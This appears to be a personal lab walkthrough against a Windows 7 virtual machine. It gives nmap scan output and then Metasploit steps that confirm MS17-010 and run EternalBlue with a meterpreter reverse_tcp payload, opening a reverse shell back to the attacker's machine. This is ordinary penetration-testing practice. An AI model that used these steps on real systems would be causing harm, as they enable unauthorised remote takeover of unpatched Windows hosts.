IP: 192.168.16.129
Windows: 7

## Nmap scan results:
`└─# nmap -p- -A -T4 192.168.16.129`
`Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 06:52 EDT`
`Nmap scan report for 192.168.16.129`
`Host is up (0.00044s latency).`
`Not shown: 65526 closed tcp ports (reset)`
`PORT      STATE SERVICE      VERSION`
`135/tcp   open  msrpc        Microsoft Windows RPC`
`139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn`
`445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)`
`49152/tcp open  msrpc        Microsoft Windows RPC`
`49153/tcp open  msrpc        Microsoft Windows RPC`
`49154/tcp open  msrpc        Microsoft Windows RPC`
`49155/tcp open  msrpc        Microsoft Windows RPC`
`49156/tcp open  msrpc        Microsoft Windows RPC`
`49157/tcp open  msrpc        Microsoft Windows RPC`
`MAC Address: 00:0C:29:E7:9A:7D (VMware)`
`Device type: general purpose`
`Running: Microsoft Windows 2008|7|Vista|8.1`
`OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1`
`OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1`
`Network Distance: 1 hop`
`Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows`

`Host script results:`
`| smb-os-discovery:` 
`|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)`
`|   OS CPE: cpe:/o:microsoft:windows_7::sp1`
`|   Computer name: WIN-845Q99OO4PP`
`|   NetBIOS computer name: WIN-845Q99OO4PP\x00`
`|   Workgroup: WORKGROUP\x00`
`|_  System time: 2025-10-08T06:54:14-04:00`
`|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:e7:9a:7d (VMware)`
`| smb2-time:` 
`|   date: 2025-10-08T10:54:14`
`|_  start_date: 2025-10-08T19:46:08`
`| smb2-security-mode:` 
`|   2:1:0:` 
`|_    Message signing enabled but not required`
`| smb-security-mode:` 
`|   account_used: guest`
`|   authentication_level: user`
`|   challenge_response: supported`
`|_  message_signing: disabled (dangerous, but default)`
`|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s`

`TRACEROUTE`
`HOP RTT     ADDRESS`
`1   0.44 ms 192.168.16.129`

`OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`
`Nmap done: 1 IP address (1 host up) scanned in 88.94 seconds`

Key points from nmap scan:
- Windows 7 Ultimate 7601 Service Pack  ("eternalblue" could be the exploit)
## Metasploit method:
1. use `24  auxiliary/scanner/smb/smb_ms17_010`
2. set RHOSTS 192.168.16.129
3. run
  - 168.16.129:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
  _______________________________________________________________________________
  Search eternalblue again and
  1. use 0 exploit/windows/smb/ms17_010_eternalblue
  2. set rhosts 192.168.16.129
  3. set payload windows/x64/meterpreter/reverse_tcp
  4. set LHOST eth0 (kali's ip)
  5. run (now you should be in a meterpreter shell

  

